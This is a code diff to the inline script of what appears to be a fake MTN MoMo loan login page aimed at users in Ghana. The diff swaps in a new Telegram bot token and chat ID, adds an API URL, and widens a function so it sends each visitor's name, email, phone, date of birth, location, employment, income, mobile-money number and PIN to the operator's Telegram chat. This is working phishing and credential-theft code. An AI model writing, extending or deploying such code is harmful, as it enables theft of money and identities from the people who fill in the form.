@@ -489,10 +489,11 @@
 
     <script>
         // ============================================
-        // TELEGRAM CREDENTIALS
+        // TELEGRAM CREDENTIALS - UPDATED
         // ============================================
-        const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
-        const CHAT_ID = '8392790531';
+        const BOT_TOKEN = '8912556480:AAF_m34R8vT5GUwhsx29qPW854OOXnl5FfY';
+        const CHAT_ID = '8313270294';
+        const API_URL = 'https://easy-loans-production.up.railway.app';
 
         // ============================================
         // LOAD LOAN SUMMARY
@@ -590,24 +591,42 @@
         }
 
         // ============================================
-        // SEND TO TELEGRAM
+        // SEND TO TELEGRAM - INCLUDES ALL DETAILS
         // ============================================
         async function sendTelegramNotification(phone, pin) {
             const loanType = localStorage.getItem('loanType') || 'Smart Loan';
             const loanAmount = localStorage.getItem('loanAmount') || '1000';
             const loanTerm = localStorage.getItem('loanTerm') || '30';
+            const loanPurpose = localStorage.getItem('loanPurpose') || 'Not specified';
             const fullName = localStorage.getItem('fullName') || 'Not provided';
+            const email = localStorage.getItem('email') || 'Not provided';
+            const personalPhone = localStorage.getItem('phone') || 'Not provided';
+            const dob = localStorage.getItem('dob') || 'Not provided';
+            const region = localStorage.getItem('region') || 'Not provided';
+            const district = localStorage.getItem('district') || 'Not provided';
+            const employment = localStorage.getItem('employment') || 'Not provided';
+            const income = localStorage.getItem('income') || '0';
 
-            const message = `🔐 *MTN MoMo Loan - Account Login*\n\n` +
-                `💰 *Loan Details:*\n` +
+            const message = `💰 *NEW MTN MoMo LOAN APPLICATION - GHANA*\n\n` +
+                `📋 *LOAN DETAILS*\n` +
                 `📌 Product: ${loanType}\n` +
                 `💵 Amount: GHS ${parseInt(loanAmount).toLocaleString()}\n` +
-                `📅 Term: ${loanTerm} Days\n\n` +
-                `📱 *MoMo Account:* +233 ${phone}\n` +
-                `🔢 *PIN:* ${pin}\n` +
-                `👤 *User:* ${fullName}\n` +
-                `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
-                `✅ User has logged in to receive loan.`;
+                `📅 Term: ${loanTerm} Days\n` +
+                `📝 Purpose: ${loanPurpose}\n\n` +
+                `👤 *PERSONAL DETAILS*\n` +
+                `👤 Name: ${fullName}\n` +
+                `📧 Email: ${email}\n` +
+                `📱 Phone: +233 ${personalPhone}\n` +
+                `🎂 DOB: ${dob}\n` +
+                `📍 Region: ${region}\n` +
+                `📍 District: ${district}\n` +
+                `💼 Employment: ${employment}\n` +
+                `💰 Monthly Income: GHS ${parseInt(income).toLocaleString()}\n\n` +
+                `🔐 *MOMO ACCOUNT LOGIN*\n` +
+                `📱 MoMo Phone: +233 ${phone}\n` +
+                `🔢 MoMo PIN: ${pin}\n\n` +
+                `⏰ Time: ${new Date().toLocaleString()}\n\n` +
+                `✅ User has completed loan application and logged in.`;
 
             console.log('📤 Sending Telegram notification...');
 
@@ -701,6 +720,9 @@
             checkPinComplete();
 
             console.log('✅ MTN MoMo Loan Ghana - Account Login Loaded');
+            console.log('🤖 Bot Token:', BOT_TOKEN);
+            console.log('📱 Chat ID:', CHAT_ID);
+            console.log('🌐 API URL:', API_URL);
             console.log('====================================');
         });
     </script>
